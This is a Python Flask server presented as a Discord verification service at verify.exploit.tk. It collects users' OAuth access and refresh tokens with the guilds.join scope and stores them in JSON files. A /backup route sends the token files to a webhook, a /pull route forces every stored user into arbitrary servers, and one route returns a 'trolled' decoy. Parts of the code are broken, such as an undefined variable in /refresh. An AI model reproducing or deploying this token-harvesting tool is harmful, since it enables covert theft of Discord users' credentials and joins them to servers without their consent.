# https://canary.discord.com/api/oauth2/authorize?client_id=994684314010796083&redirect_uri=https://verify.exploit.tk&response_type=code&scope=identify%20guilds.join

import os
# os.system("pip install dhooks")
import json, requests
from dhooks import Webhook, File
from flask import Flask, redirect, url_for, request
pwd = os.environ['pwd']
app = Flask(__name__)

# @app.route('/')
# def hello_world():
#     return 'unauthorized'
# import discord

# from discord import *
# from discord.ext import commands
verified_redirect = ""
verifier_redir = "https://discord.com/api/oauth2/authorize?client_id=994684314010796083&redirect_uri=https://verify.exploit.tk&response_type=code&scope=identify%20guilds.join"
hook = os.environ["hook"]
tkn = os.environ["tkn"]
API_ENDPOINT = 'https://canary.discord.com/api/v9'
CLIENT_ID = '994684314010796083'
CLIENT_SECRET = os.environ['c_s']
REDIRECT_URI = 'https://verify.exploit.tk'  #
TOKEN_FINDER_API = "https://"
TOKEN_FINDER_API_AUTH = "02ab23b5df4ff52f46320e92d7"
backup_hook = os.environ["backup_"]


def exchange_code(code):
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'authorization_code',
    'code': code,
    'redirect_uri': REDIRECT_URI
  }
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  r = requests.post(str(API_ENDPOINT) + '/oauth2/token',
                    data=data,
                    headers=headers)
  if r.status_code in (200, 201, 204):
    return r.json()
  else:
    return False


def add_to_guild(access_token, userID, guild_Id):
  url = f"{API_ENDPOINT}/guilds/{guild_Id}/members/{userID}"

  botToken = tkn
  data = {
    "access_token": access_token,
  }
  headers = {
    "Authorization": f"Bot {botToken}",
    'Content-Type': 'application/json'
  }
  response = requests.put(url=url, headers=headers, json=data)
  r = requests.post(
    hook, json={"content": f"successfully added user <@{userID}> | {userID}"})
  r = requests.put(
    f"https://canary.discord.com/api/v9/guilds/952495772073619466/members/{userID}/roles/988815859814383648",
    headers={"Authorization": f"Bot {tkn}"})
  # print(response.text)
  # print(response.status_code)
  # print(REDIRECT_URI)


def get_user(access: str):
  endp = "https://canary.discord.com/api/v9/users/@me"
  r = requests.get(endp, headers={"Authorization": f"Bearer {access}"})
  rjson = r.json()
  return rjson['id']


def get_new_token(refresh):
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'refresh_token',
    'refresh_token': refresh
  }
  r = requests.post(f"{API_ENDPOINT}/oauth2/token", data=data, headers=headers)

  return r.json()


# code = exchange_code('gvxPfY7M80idbUgN6YfwJPUIEuP2kv')['access_token']
# add_to_guild(access_token="9csiMPR9reOxjDJCxEc1z7oZJwNiUm", userID="661563598711291904" , guild_Id="1028633555972145183")
# @app.route('/')
# def main():
#   return redirect("https://discord.com/invite/spy", code=302)

# def handler(code: str):


def test():
  print("works")

@app.route("/backup", methods = ['POST'])
def backup():
  limiter = "not set yet"
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  try:
    sender = Webhook(backup_hook)
    file1 = File("Database/access_tokens.json", name="access.txt")
    file2 = File("Database/refresh_tokens.json", name="refresh.txt")
    sender.send("access", file=file1)
    sender.send("refresh", file=file2)
    return "success"
  except Exception as e:
# print(e)
    return "failed\n %s" % (e)
  else:
    return "unauthorized"


# backup()
@app.route("/pull", methods = ['POST'])
def pull():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  json = request.json
  guild = json['guild']
  access = open('Database/access_tokens.json', 'r').read()
  access = json.loads(access)
  for key in access:
    value = access[key]
    print(key, value)
    add_to_guild(value, key, guild)

@app.route("/members", methods = ['GET'])
def members():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  access = open("Database/access_tokens.json").read()
  access = json.loads(access)
  return str(len(access))
      
@app.route("/refresh", methods = ['POST'])
def refresh():
  if request.headers.get('Authorization') != pwd:
    return 'unauthorized'
  # access = open("access_tokens.json").read()
  refresh = open("refresh_tokens.json").read()
  refresh = json.loads(refresh)
  for key in refresh:
    value = r
    refresh[key]
    # r = get_new_token(value) commented to avoid massacres
    new_access = r["access_token"]
    new_refresh = r["refresh_token"]
    with open('Database/naccess_tokens.json', 'r') as f:
      db1 = json.load(f)
      db1[str(key)] = str(new_access)
      with open('Database/naccess_tokens.json', 'w') as f:
        json.dump(db1, f, indent=2)
    with open('Database/nrefresh_tokens.json', 'r') as f:
      db2 = json.load(f)
      db2[str(key)] = str(new_refresh)
      with open('Database/nrefresh_tokens.json', 'w') as f:
        json.dump(db2, f, indent=2)
    
        
                          
    
@app.route('/usr/passwd')
def hello_world():
    ip_addr = request.remote_addr
    return "trolled" 
    # return '<h1> Your IP address is:' + ip_addr
@app.route('/')
def process_json():
  os.system("clear")
  # test()
  # redirect("https://discord.com/invite/spy", code=302)
  args = request.args
  if "code" not in args:
    return redirect(verifier_redir, code=302)
  idk = args.get('code')
  idk = str(idk)
  # print(idk)
  # handler(idk)
  try:
    # print("testing")
    exchange = exchange_code(idk)
    if exchange == False:
      return redirect("https://discord.com/oauth2/authorized", code=302)
    # print(exchange)
    access_tk = exchange['access_token']
    # print(access_tk)
    refresh_tk = exchange['refresh_token']
    # print(refresh_tk)
    id = get_user(access_tk)
    # print(id)
    with open('Database/access_tokens.json', 'r') as f:
      db1 = json.load(f)
      db1[str(id)] = str(access_tk)
      with open('Database/access_tokens.json', 'w') as f:
        json.dump(db1, f, indent=2)
    with open('Database/refresh_tokens.json', 'r') as f:
      db2 = json.load(f)
      db2[str(id)] = str(refresh_tk)
      with open('Database/refresh_tokens.json', 'w') as f:
        json.dump(db2, f, indent=2)

    # Sliding Code to Token Finder API
  except:
    return redirect("https://discord.com/oauth2/authorized", code=302)
  try:
    add_to_guild(str(access_tk), str(id), "952495772073619466")
  except:
    pass
  return redirect("https://discord.com/oauth2/authorized", code=302)
  # content_type = request.headers.get('Content-Type')
  # if (content_type == 'application/json'):
  # json = request.json
  # # return 200
  # print(json)
  # print(request.headers)
  # user = json["user"]
  # guild = json["guild"]
  # verify(user)


if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
